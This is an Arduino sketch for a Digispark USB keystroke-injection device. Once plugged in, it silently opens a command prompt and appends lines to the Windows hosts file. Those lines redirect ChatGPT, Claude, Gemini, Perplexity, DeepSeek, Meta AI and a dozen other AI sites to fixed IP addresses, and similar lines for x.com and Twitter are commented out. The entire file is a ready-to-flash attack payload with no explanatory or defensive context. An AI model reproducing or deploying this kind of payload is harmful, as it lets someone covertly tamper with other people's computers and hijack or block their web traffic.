#include <DigiKeyboard.h>

void setup() {
}

void loop() {
  static bool hasRun = false;
  if (hasRun) {
    DigiKeyboard.delay(5000);
    return;
  }

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(750);

  DigiKeyboard.println(F("ECHO 199.80.54.63 chatgpt.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 199.80.54.63 www.chatgpt.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.16.19.9 claude.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.16.19.9 www.claude.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 142.250.190.78 gemini.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 142.250.190.78 www.gemini.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  // DigiKeyboard.println(F("ECHO 104.244.42.129 x.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  // DigiKeyboard.println(F("ECHO 104.244.42.129 www.x.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  // DigiKeyboard.println(F("ECHO 104.244.42.129 twitter.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  // DigiKeyboard.println(F("ECHO 104.244.42.129 www.twitter.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.18.7.89 perplexity.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.18.7.89 www.perplexity.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.18.2.199 poe.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.18.2.199 www.poe.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.22.34.2 character.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.22.34.2 www.character.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.18.2.122 chat.mistral.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.18.2.122 www.chat.mistral.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.17.3.191 huggingface.co >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.17.3.191 www.huggingface.co >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 20.112.52.29 copilot.microsoft.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 20.112.52.29 www.copilot.microsoft.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.18.10.176 you.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.18.10.176 www.you.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.26.0.91 blackbox.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.26.0.91 www.blackbox.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.26.0.91 venice.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.26.0.91 www.venice.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.18.10.36 pi.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.18.10.36 www.pi.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 104.18.26.110 deepseek.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 104.18.26.110 www.deepseek.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("ECHO 157.240.229.35 meta.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));
  DigiKeyboard.println(F("ECHO 157.240.229.35 www.meta.ai >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS"));

  DigiKeyboard.println(F("exit"));
  DigiKeyboard.delay(500);

  hasRun = true;
}
